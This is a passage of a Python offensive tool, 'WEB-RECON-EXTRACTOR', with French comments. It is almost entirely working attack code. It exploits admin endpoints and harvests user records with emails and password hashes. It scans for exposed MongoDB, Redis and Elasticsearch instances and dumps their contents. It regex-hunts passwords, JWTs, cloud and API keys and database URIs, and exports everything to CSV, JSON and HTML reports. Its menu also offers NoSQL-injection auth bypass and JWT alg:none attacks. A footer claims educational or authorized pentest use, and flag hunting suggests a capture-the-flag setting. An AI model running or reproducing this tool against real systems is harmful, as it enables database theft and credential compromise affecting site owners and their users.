                    self.results['extracted_users'].append(data)

    # ==================== PHASE 6 : ADMIN EXPLOIT ====================

    def phase_6_admin_exploit(self):
        self._section("PHASE 6 — ADMIN EXPLOITATION (avec token)")

        auth_headers = self._auth_headers()
        if not auth_headers:
            print(f"  {self._c('ℹ', 'blue')} Aucun token — tentative sans auth...")

        endpoints_to_test = ADMIN_ENDPOINTS + [
            ep for ep in self.results['endpoints']
            if 'admin' in ep.lower() or 'export' in ep.lower() or 'dump' in ep.lower()
        ]

        for ep in endpoints_to_test[:40]:
            url = urljoin(self.base_url, ep)
            info = self._request(url, headers=auth_headers)

            if info['status'] == 200 and info['body']:
                body = info['body']
                is_json = 'application/json' in info['content_type']

                # Vérifier si c'est utile (pas une page 404)
                if len(body) < 200 and 'not found' in body.lower():
                    continue

                # On a trouvé un endpoint admin qui répond
                try:
                    data = json.loads(body)
                except Exception:
                    data = body[:5000]

                self.results['admin_data'].append({
                    'endpoint': ep,
                    'url': url,
                    'status': info['status'],
                    'size': info['size'],
                    'data': data,
                })
                print(f"  {self._c('🔴', 'red')} {ep} → {info['size']}o")
                self._log_finding('admin_endpoint', f'Endpoint admin récupéré : {ep}',
                                  {'endpoint': ep, 'size': info['size']})

                # Cherche des users dedans
                if isinstance(data, dict):
                    self._harvest_users(data)
                elif isinstance(data, list):
                    for item in data[:100]:
                        if isinstance(item, dict):
                            self._harvest_users(item)

            time.sleep(self.config['delay'])

        print(f"\n  {self._c('✓', 'green')} {len(self.results['admin_data'])} endpoint(s) admin exploité(s)")

    def _harvest_users(self, data):
        """Cherche des users dans une structure de données."""
        # Recherche récursive de dicts ressemblant à des users
        if isinstance(data, dict):
            keys_lower = [k.lower() for k in data.keys()]
            if any(k in keys_lower for k in ['email', 'username', 'password', 'password_hash']):
                self.results['extracted_users'].append(data)
            else:
                for v in data.values():
                    if isinstance(v, (dict, list)):
                        self._harvest_users(v)
        elif isinstance(data, list):
            for item in data[:200]:
                self._harvest_users(item)

    # ==================== PHASE 7 : SERVICES EXPOSÉS ====================

    def phase_7_services(self):
        self._section("PHASE 7 — SERVICES EXPOSÉS (MongoDB, Redis, Elasticsearch)")

        # On teste les ports classiques sur le host cible
        services = [
            (27017, 'MongoDB'),
            (6379, 'Redis'),
            (9200, 'Elasticsearch'),
            (5432, 'PostgreSQL'),
            (3306, 'MySQL'),
            (11211, 'Memcached'),
            (5984, 'CouchDB'),
            (8086, 'InfluxDB'),
            (2379, 'etcd'),
            (8123, 'ClickHouse'),
        ]

        host = self.target_host
        for port, name in services:
            if self._check_port_open(host, port, timeout=3):
                print(f"  {self._c('🔴', 'red')} {name} port {port} OUVERT")
                self.results['services_open'].append({'port': port, 'service': name})
                self._log_finding('service_open', f'{name} ouvert sur {host}:{port}',
                                  {'port': port, 'service': name})

                # Tentative d'exploitation
                if port == 27017:
                    self._exploit_mongodb(host, port)
                elif port == 6379:
                    self._exploit_redis(host, port)
                elif port == 9200:
                    self._exploit_elasticsearch(host, port)
            else:
                print(f"  {self._c('✗', 'dim')} {name} port {port} fermé")

    def _check_port_open(self, host, port, timeout=3):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(timeout)
            result = s.connect_ex((host, port))
            s.close()
            return result == 0
        except Exception:
            return False

    def _exploit_mongodb(self, host, port):
        """Tente d'extraire les DB MongoDB."""
        print(f"    {self._c('🎯', 'yellow')} Tentative connexion MongoDB...")
        try:
            from pymongo import MongoClient
        except ImportError:
            print(f"    {self._c('ℹ', 'blue')} pymongo non installé (pip install pymongo)")
            # Tentative via subprocess mongosh si dispo
            if shutil.which('mongosh') or shutil.which('mongo'):
                shell = 'mongosh' if shutil.which('mongosh') else 'mongo'
                try:
                    result = subprocess.run(
                        [shell, f'mongodb://{host}:{port}/', '--quiet', '--eval',
                         'JSON.stringify(db.adminCommand({listDatabases:1}))'],
                        capture_output=True, text=True, timeout=15
                    )
                    if result.returncode == 0:
                        print(f"    {self._c('💥', 'red', bold=True)} MongoDB SANS AUTH !")
                        print(f"    {result.stdout[:500]}")
                        self._log_finding('mongo_open', f'MongoDB {host}:{port} sans auth',
                                          {'output': result.stdout[:1000]})
                except Exception as e:
                    print(f"    ✗ {e}")
            return

        try:
            client = MongoClient(f'mongodb://{host}:{port}/',
                                 serverSelectionTimeoutMS=5000)
            dbs = client.list_database_names()
            print(f"    {self._c('💥', 'red', bold=True)} MongoDB SANS AUTH — {len(dbs)} DB(s)")

            for db_name in dbs:
                if db_name in ['admin', 'local', 'config']:
                    continue
                try:
                    db = client[db_name]
                    collections = db.list_collection_names()
                    print(f"    📁 DB '{db_name}' : {len(collections)} collections")

                    dump_data = {'db': db_name, 'collections': {}}
                    for coll in collections:
                        try:
                            docs = list(db[coll].find().limit(1000))
                            # Convertir ObjectId en str
                            for d in docs:
                                for k, v in list(d.items()):
                                    if hasattr(v, '__str__') and not isinstance(v, (str, int, float, bool, type(None), list, dict)):
                                        d[k] = str(v)
                            dump_data['collections'][coll] = docs
                            print(f"      • {coll} : {len(docs)} documents")
                        except Exception as e:
                            print(f"      ✗ {coll}: {e}")

                    self.results['mongo_dumps'].append(dump_data)
                    self._log_finding('mongo_dump', f'DB {db_name} extraite',
                                      {'collections': len(dump_data['collections'])})
                except Exception as e:
                    print(f"    ✗ DB {db_name}: {e}")

            client.close()
        except Exception as e:
            print(f"    ✗ MongoDB accessible mais auth requise : {e}")

    def _exploit_redis(self, host, port):
        """Tente d'extraire Redis."""
        print(f"    {self._c('🎯', 'yellow')} Tentative Redis...")
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(5)
            s.connect((host, port))
            s.send(b'PING\r\n')
            resp = s.recv(100)
            if b'PONG' in resp:
                print(f"    {self._c('💥', 'red', bold=True)} Redis SANS AUTH !")
                s.send(b'KEYS *\r\n')
                time.sleep(0.3)
                keys_data = s.recv(10000)
                keys = keys_data.decode(errors='ignore').split('\r\n')
                print(f"    {len([k for k in keys if k])} clés trouvées")
                self._log_finding('redis_open', f'Redis {host}:{port} sans auth',
                                  {'keys_preview': keys[:20]})
            s.close()
        except Exception as e:
            print(f"    ✗ {e}")

    def _exploit_elasticsearch(self, host, port):
        """Tente d'extraire Elasticsearch."""
        print(f"    {self._c('🎯', 'yellow')} Tentative Elasticsearch...")
        try:
            r = requests.get(f'http://{host}:{port}/_cat/indices?format=json', timeout=5)
            if r.status_code == 200:
                indices = r.json()
                print(f"    {self._c('💥', 'red', bold=True)} Elasticsearch SANS AUTH — {len(indices)} index")
                self._log_finding('elasticsearch_open', f'ES {host}:{port} sans auth',
                                  {'indices': [i.get('index') for i in indices[:20]]})
        except Exception as e:
            print(f"    ✗ {e}")

    # ==================== PHASE 8 : HUNT ====================

    def phase_8_hunt(self):
        self._section("PHASE 8 — HUNT (flags, secrets, credentials)")

        # On chasse dans TOUTES les réponses déjà collectées
        all_texts = []

        # Responses
        for req in self.all_requests:
            if req.get('body'):
                all_texts.append((req['url'], req['body']))

        # Tokens
        for t in self.results['tokens']:
            all_texts.append((f"token:{t.get('source')}", t.get('token', '')))

        # Admin data
        for a in self.results['admin_data']:
            try:
                all_texts.append((a['endpoint'], json.dumps(a['data'], default=str)))
            except Exception:
                pass

        # IDOR data
        for idor in self.results['idor_data']:
            for obj in idor.get('objects', []):
                try:
                    all_texts.append((f"idor:{idor['pattern']}#{obj['id']}",
                                      json.dumps(obj['data'], default=str)))
                except Exception:
                    pass

        # Fichiers dumpés
        for root, _, files in os.walk(self._output_dir()):
            for fname in files:
                fpath = os.path.join(root, fname)
                try:
                    with open(fpath, 'r', errors='ignore') as f:
                        all_texts.append((fpath, f.read(1000000)))
                except Exception:
                    pass

        # Chasse
        seen_flags = set()
        seen_secrets = set()
        for source, text in all_texts:
            for name, pattern in HUNT_PATTERNS.items():
                try:
                    matches = re.findall(pattern, text, re.IGNORECASE)
                except Exception:
                    continue
                for m in matches:
                    m_str = m if isinstance(m, str) else str(m)
                    if name == 'flag':
                        if m_str not in seen_flags:
                            seen_flags.add(m_str)
                            self.results['flags'].append({'flag': m_str, 'source': source})
                            print(f"  {self._c('🚩 FLAG', 'red', bold=True)} {m_str}")
                            print(f"      Source: {source[:100]}")
                    elif name in ('password', 'jwt', 'private_key', 'aws_key',
                                  'stripe_key', 'github_token', 'google_api',
                                  'mongo_uri', 'postgres_uri', 'mysql_uri', 'redis_uri'):
                        key = (name, m_str[:100])
                        if key not in seen_secrets:
                            seen_secrets.add(key)
                            self.results['secrets'].append({
                                'type': name, 'value': m_str[:300], 'source': source[:200],
                            })

        print(f"\n  {self._c('✓', 'green')} {len(self.results['flags'])} flag(s), "
              f"{len(self.results['secrets'])} secret(s) trouvé(s)")

    # ==================== SAVE / EXPORT ====================

    def _output_dir(self):
        d = f"{self.config['output_dir']}/{self.target_domain}"
        os.makedirs(d, exist_ok=True)
        return d

    def save_results(self):
        out = self._output_dir()

        # JSON complet
        json_path = f"{out}/results.json"
        with open(json_path, 'w', encoding='utf-8') as f:
            json.dump(self.results, f, indent=2, default=str)

        # Users extraits
        if self.results['extracted_users']:
            users_path = f"{out}/extracted_users.json"
            with open(users_path, 'w', encoding='utf-8') as f:
                json.dump(self.results['extracted_users'], f, indent=2, default=str)
            # CSV aussi
            csv_path = f"{out}/extracted_users.csv"
            all_keys = set()
            for u in self.results['extracted_users'][:1000]:
                if isinstance(u, dict):
                    all_keys.update(u.keys())
            all_keys = list(all_keys)
            with open(csv_path, 'w', newline='', encoding='utf-8') as f:
                if all_keys:
                    w = csv.DictWriter(f, fieldnames=all_keys, extrasaction='ignore')
                    w.writeheader()
                    for u in self.results['extracted_users'][:1000]:
                        if isinstance(u, dict):
                            w.writerow(u)

        # Mongo dumps
        for i, dump in enumerate(self.results['mongo_dumps']):
            db_name = dump.get('db', f'db_{i}').replace('/', '_')
            path = f"{out}/mongo_{db_name}.json"
            with open(path, 'w', encoding='utf-8') as f:
                json.dump(dump, f, indent=2, default=str)

        # Flags
        if self.results['flags']:
            with open(f"{out}/flags.txt", 'w', encoding='utf-8') as f:
                for fl in self.results['flags']:
                    f.write(f"{fl['flag']}    # {fl['source']}\n")

        # Secrets
        if self.results['secrets']:
            with open(f"{out}/secrets.txt", 'w', encoding='utf-8') as f:
                for sec in self.results['secrets']:
                    f.write(f"[{sec.get('type', '?')}] {sec.get('value', '')}    # {sec.get('source', '?')}\n")

        # IDOR data
        if self.results['idor_data']:
            path = f"{out}/idor_extracted.json"
            with open(path, 'w', encoding='utf-8') as f:
                json.dump(self.results['idor_data'], f, indent=2, default=str)

        # Admin data
        if self.results['admin_data']:
            path = f"{out}/admin_extracted.json"
            with open(path, 'w', encoding='utf-8') as f:
                json.dump(self.results['admin_data'], f, indent=2, default=str)

        # HTML report
        self._write_html_report(out)

        return out

    def _write_html_report(self, out):
        by_module = defaultdict(int)
        for f in self.findings:
            by_module[f['category']] += 1

        html = f"""<!DOCTYPE html>
<html lang="fr">
<head>
<meta charset="UTF-8">
<title>WEB-RECON-EXTRACTOR Report</title>
<style>
body {{ font-family: -apple-system, Arial, sans-serif; background: #0d1117; color: #c9d1d9; margin: 0; padding: 20px; }}
.container {{ max-width: 1200px; margin: auto; }}
h1 {{ color: #58a6ff; border-bottom: 2px solid #30363d; padding-bottom: 10px; }}
h2 {{ color: #7ee787; margin-top: 30px; }}
h3 {{ color: #79c0ff; }}
.meta {{ background: #161b22; padding: 15px; border-radius: 8px; border: 1px solid #30363d; }}
.stat {{ display: inline-block; background: #1f6feb; padding: 8px 16px; border-radius: 6px; margin: 5px 10px 5px 0; font-weight: bold; }}
.stat.danger {{ background: #da3633; }}
.stat.success {{ background: #238636; }}
.stat.warn {{ background: #d29922; }}
.stat.flag {{ background: #8957e5; }}
.finding {{ background: #161b22; padding: 15px; margin: 15px 0; border-left: 4px solid #f85149; border-radius: 6px; }}
.finding.flag {{ border-left-color: #8957e5; }}
.finding.secret {{ border-left-color: #d29922; }}
pre {{ background: #0d1117; padding: 10px; border-radius: 4px; overflow-x: auto; color: #7ee787; font-size: 12px; max-height: 400px; }}
code {{ background: #161b22; padding: 2px 6px; border-radius: 3px; color: #79c0ff; }}
table {{ width: 100%; border-collapse: collapse; margin-top: 10px; }}
th {{ background: #21262d; padding: 10px; text-align: left; color: #7ee787; }}
td {{ padding: 8px; border-bottom: 1px solid #30363d; font-size: 13px; }}
.footer {{ text-align: center; margin-top: 40px; color: #6e7681; font-size: 12px; }}
</style>
</head>
<body>
<div class="container">
<h1>🎯 WEB-RECON-EXTRACTOR — Rapport d'extraction</h1>

<div class="meta">
<p><strong>Cible :</strong> <code>{self.target_url}</code></p>
<p><strong>Date :</strong> {self.results['timestamp']}</p>
<p><strong>Requêtes envoyées :</strong> {len(self.all_requests)}</p>
</div>

<h2>📊 Résumé</h2>
<div>
<span class="stat">Endpoints : {len(self.results['endpoints'])}</span>
<span class="stat">Fichiers sensibles : {len(self.results['sensitive_files'])}</span>
<span class="stat warn">Tokens : {len(self.results['tokens'])}</span>
<span class="stat danger">Users extraits : {len(self.results['extracted_users'])}</span>
<span class="stat danger">Admin endpoints : {len(self.results['admin_data'])}</span>
<span class="stat danger">IDOR : {len(self.results['idor_data'])}</span>
<span class="stat danger">MongoDB dumps : {len(self.results['mongo_dumps'])}</span>
<span class="stat flag">🚩 Flags : {len(self.results['flags'])}</span>
<span class="stat warn">Secrets : {len(self.results['secrets'])}</span>
</div>
"""

        if self.results['flags']:
            html += "<h2>🚩 Flags trouvés</h2>"
            for fl in self.results['flags']:
                html += f'<div class="finding flag"><h3>{fl["flag"]}</h3>'
                html += f'<p>Source : <code>{fl["source"]}</code></p></div>'

        if self.results['secrets']:
            html += "<h2>💎 Secrets trouvés</h2>"
            for sec in self.results['secrets'][:100]:
                html += f'<div class="finding secret">'
                html += f'<p><strong>[{sec.get("type", "?")}]</strong> <code>{sec.get("value", "")[:200]}</code></p>'
                html += f'<p>Source : {sec.get("source", "?")[:100]}</p></div>'

        if self.results['extracted_users']:
            html += f"<h2>👥 Users extraits ({len(self.results['extracted_users'])})</h2>"
            html += '<table><tr><th>#</th><th>Username/Email</th><th>Role</th></tr>'
            for i, u in enumerate(self.results['extracted_users'][:50], 1):
                if isinstance(u, dict):
                    uname = u.get('username') or u.get('email') or u.get('name') or '?'
                    role = u.get('role') or u.get('isAdmin') or '?'
                    html += f'<tr><td>{i}</td><td>{uname}</td><td>{role}</td></tr>'
            html += '</table>'

        if self.results['mongo_dumps']:
            html += "<h2>🗄️ MongoDB dumps</h2>"
            for dump in self.results['mongo_dumps']:
                html += f'<h3>DB : {dump.get("db", "?")}</h3>'
                for coll, docs in dump.get('collections', {}).items():
                    html += f'<details><summary><strong>{coll}</strong> ({len(docs)} docs)</summary>'
                    html += f'<pre>{json.dumps(docs[:10], indent=2, default=str)[:3000]}</pre>'
                    html += '</details>'

        if self.results['admin_data']:
            html += f"<h2>🔐 Endpoints admin exploités ({len(self.results['admin_data'])})</h2>"
            for a in self.results['admin_data']:
                html += f'<details><summary><strong>{a["endpoint"]}</strong> ({a["size"]}o)</summary>'
                try:
                    preview = json.dumps(a['data'], indent=2, default=str)[:3000]
                except Exception:
                    preview = str(a['data'])[:3000]
                html += f'<pre>{preview}</pre></details>'

        if self.results['idor_data']:
            html += f"<h2>🎯 IDOR extraits ({len(self.results['idor_data'])})</h2>"
            for idor in self.results['idor_data']:
                html += f'<h3>{idor["pattern"]} ({idor["count"]} objets)</h3>'
                html += f'<pre>{json.dumps(idor["objects"][:5], indent=2, default=str)[:3000]}</pre>'

        if self.results['services_open']:
            html += "<h2>🌐 Services exposés</h2><ul>"
            for s in self.results['services_open']:
                html += f'<li>{s["service"]} sur port {s["port"]}</li>'
            html += "</ul>"

        html += f"""
<div class="footer">
WEB-RECON-EXTRACTOR v1.0 — {self.results['timestamp']}<br>
Usage éducatif / pentest autorisé uniquement.
</div>
</div>
</body>
</html>"""

        path = f"{out}/report.html"
        with open(path, 'w', encoding='utf-8') as f:
            f.write(html)

    # ==================== ORCHESTRATEUR ====================

    def run(self, phases=None, **kwargs):
        phases = phases or [1, 2, 3, 4, 5, 6, 7, 8]

        print(f"\n{self._c('🎯 Cible :', 'bold')} {self.target_url}")
        print(f"{self._c('📅 Date  :', 'bold')} {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
        print(f"{self._c('🧩 Phases:', 'bold')} {phases}")

        try:
            if 1 in phases:
                self.phase_1_discovery()
            if 2 in phases:
                self.phase_2_sensitive_files()
            if 3 in phases:
                self.phase_3_auth_bypass(
                    login_path=kwargs.get('login_path', '/api/login'),
                    username_field=kwargs.get('username_field', 'username'),
                    password_field=kwargs.get('password_field', 'password'),
                    extra_static=kwargs.get('extra_static'),
                )
            if 4 in phases:
                self.phase_4_jwt_attacks()
            if 5 in phases:
                self.phase_5_idor()
            if 6 in phases:
                self.phase_6_admin_exploit()
            if 7 in phases:
                self.phase_7_services()
            if 8 in phases:
                self.phase_8_hunt()
        except KeyboardInterrupt:
            print(f"\n{self._c('⚠️ Interrompu', 'yellow')}")

        # Résumé
        self._print_summary()
        out = self.save_results()
        print(f"\n{self._c('📁 Résultats sauvegardés dans :', 'bold')} {out}")
        print(f"  • results.json")
        if self.results['extracted_users']:
            print(f"  • extracted_users.json ({len(self.results['extracted_users'])} users)")
            print(f"  • extracted_users.csv")
        if self.results['mongo_dumps']:
            print(f"  • mongo_*.json ({len(self.results['mongo_dumps'])} DB)")
        if self.results['flags']:
            print(f"  • flags.txt ({len(self.results['flags'])} flags)")
        if self.results['secrets']:
            print(f"  • secrets.txt ({len(self.results['secrets'])} secrets)")
        print(f"  • report.html")

    def _print_summary(self):
        self._section("RÉSUMÉ FINAL")
        r = self.results
        print(f"  Endpoints trouvés      : {len(r['endpoints'])}")
        print(f"  Fichiers sensibles     : {len(r['sensitive_files'])}")
        print(f"  .git/ exposé           : {'OUI' if r['git_dump']['exposed'] else 'non'}")
        print(f"  .env leaké             : {'OUI' if r['env_leaked']['found'] else 'non'}")
        print(f"  Tokens récupérés       : {len(r['tokens'])}")
        print(f"  Findings JWT           : {len(r['jwt_findings'])}")
        print(f"  Objets IDOR            : {sum(x['count'] for x in r['idor_data'])}")
        print(f"  Endpoints admin OK     : {len(r['admin_data'])}")
        print(f"  Users extraits         : {len(r['extracted_users'])}")
        print(f"  MongoDB dumps          : {len(r['mongo_dumps'])}")
        print(f"  Services exposés       : {len(r['services_open'])}")
        print(f"  {self._c('🚩 Flags trouvés       : ' + str(len(r['flags'])), 'red', bold=True)}")
        print(f"  Secrets/clés API       : {len(r['secrets'])}")

        if r['flags']:
            print(f"\n  {self._c('🚩 FLAGS :', 'red', bold=True)}")
            for fl in r['flags']:
                print(f"    • {self._c(fl['flag'], 'red', bold=True)}")


# ==================== MENU INTERACTIF ====================

def interactive_menu():
    print("\n" + "=" * 78)
    print("  CONFIGURATION DE LA CIBLE")
    print("=" * 78)
    url = input("  URL cible (ex: http://localhost:5000) : ").strip()
    if not url:
        print("  ✗ URL vide, annulation.")
        return
    if not url.startswith(('http://', 'https://')):
        url = 'http://' + url

    print("\n  ─── Modules à exécuter ───")
    print("  [1] Discovery       — endpoints, swagger, JS parsing")
    print("  [2] Sensitive files — .git, .env, backups")
    print("  [3] Auth bypass     — NoSQL injections")
    print("  [4] JWT attacks     — alg:none, secret faible")
    print("  [5] IDOR scanner    — /api/users/1..N")
    print("  [6] Admin exploit   — endpoints admin avec token")
    print("  [7] Services        — MongoDB:27017, Redis:6379, etc.")
    print("  [8] Hunt            — flags, secrets, credentials")
    print("  [0] TOUS les modules")
    choice = input("\n  Choix (ex: 1,2,3 ou 0) : ").strip()

    if choice == '0' or not choice:
        phases = [1, 2, 3, 4, 5, 6, 7, 8]
    else:
        try:
            phases = [int(x.strip()) for x in choice.split(',')]
            phases = [p for p in phases if 1 <= p <= 8]
        except ValueError:
            print("  ✗ Choix invalide")
            return

    login_path = '/api/login'
    if 3 in phases:
        lp = input(f"\n  Login endpoint [{login_path}] : ").strip()
        if lp:
            login_path = lp
        uf = input("  Champ username [username] : ").strip() or "username"
        pf = input("  Champ password [password] : ").strip() or "password"
    else:
        uf, pf = "username", "password"

    extractor = WebReconExtractor()
    extractor.target_url = url
    extractor.target_domain = urlparse(url).netloc
    extractor.target_host = urlparse(url).hostname
    extractor.target_port = urlparse(url).port or (443 if url.startswith('https') else 80)
    extractor.base_url = f"{urlparse(url).scheme}://{urlparse(url).netloc}"
    extractor.results['target'] = url

    extractor.run(phases=phases, login_path=login_path,
                  username_field=uf, password_field=pf)


# ==================== CLI ====================

def run_cli(args):
    extractor = WebReconExtractor()

    url = args.url
    if not url.startswith(('http://', 'https://')):
        url = 'http://' + url

    parsed = urlparse(url)
    extractor.target_url = url
    extractor.target_domain = parsed.netloc
    extractor.target_host = parsed.hostname
    extractor.target_port = parsed.port or (443 if parsed.scheme == 'https' else 80)
    extractor.base_url = f"{parsed.scheme}://{parsed.netloc}"
    extractor.results['target'] = url

    if args.phases == 'all':
        phases = [1, 2, 3, 4, 5, 6, 7, 8]
    else:
        phases = [int(x.strip()) for x in args.phases.split(',') if x.strip().isdigit()]
        phases = [p for p in phases if 1 <= p <= 8]

    extractor.run(phases=phases,
                  login_path=args.login_path,
                  username_field=args.username_field,
                  password_field=args.password_field)


def main():
    parser = argparse.ArgumentParser(
        description='WEB-RECON-EXTRACTOR v1.0 — Extraction de DB sur sites modernes'
    )
    parser.add_argument('url', nargs='?', help='URL cible')
    parser.add_argument('--phases', default='all', help='Phases à exécuter (ex: 1,2,3 ou all)')
    parser.add_argument('--login-path', default='/api/login')
    parser.add_argument('--username-field', default='username')
    parser.add_argument('--password-field', default='password')

    args = parser.parse_args()

    if args.url:
        run_cli(args)
    else:
        interactive_menu()


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n\n👋 Interrompu.")
        sys.exit(0)
    except Exception as e:
        print(f"\n❌ Erreur fatale : {e}")
        import traceback
        traceback.print_exc()
        sys.exit(1)